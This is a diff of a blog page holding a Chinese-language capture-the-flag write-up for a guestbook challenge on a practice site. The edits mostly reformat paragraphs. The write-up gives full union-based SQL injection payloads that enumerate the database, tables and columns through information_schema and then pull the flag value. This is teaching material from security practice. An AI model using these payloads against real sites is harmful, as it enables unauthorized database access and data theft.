@@ -90,7 +90,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/09/30/guestbook/guestbook.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/09/30/guestbook/sql1.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/09/30/guestbook/sql2.PNG">
-<meta property="og:updated_time" content="2019-09-30T07:42:23.464Z">
+<meta property="og:updated_time" content="2019-11-25T03:25:24.688Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="guestbook">
 <meta name="twitter:description" content="[src = hackme] guestbook题目描述This guestbook sucks. sqlmap is your friend.">
@@ -362,8 +362,10 @@
 <p><img src="./guestbook.PNG" alt="guest"></p>
 <p>题目的提示已经说明这是一个SQL注入题目，现在查看注入点，点击添加的消息，发现URL为：<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=13362" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=13362</a>。<br>测试后面的id字段：添加’，输出Sorry, no data for this。说明存在注入。</p>
 <p>按照注入的基本步骤，首先数据库名，表名，字段然后数据的次序进行。<br>使用union注入，需要测试后面的列数，测试到4时（?mod=read&amp;id=-1 union select 1,2,3,4 #），输出结果如下：<br>（id=-1是使得前面的字句没有返回，这样页面就可以显示union后面字句查询的内容）<br><img src="./sql1.PNG" alt="guest1"><br>其中显示2,3,4的位置都是有输出的位置，可以用来显示注入得到的数据。</p>
-<p>注入数据库名字，在第3列显示：<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#&gt;<br>得到数据库名字为g8.</p>
-<p>执行<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#&gt;<br>得到表名为flag的表。</p>
+<p>注入数据库名字，在第3列显示：</p>
+<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#</p>
+<p>得到数据库名字为g8.执行:</p>
+<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#<br>得到表名为flag的表。</p>
 <p>测试flag表的字段，输入如下的注入语句时得到flag字段。<br>?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=’flag’ limit 1,1),4#</p>
 <p>最后一步获取字段的值：<br>?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4#</p>
 <p>得到如下输出，即为flag：<br><img src="./sql2.PNG" alt="guest1"></p>
@@ -538,7 +540,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
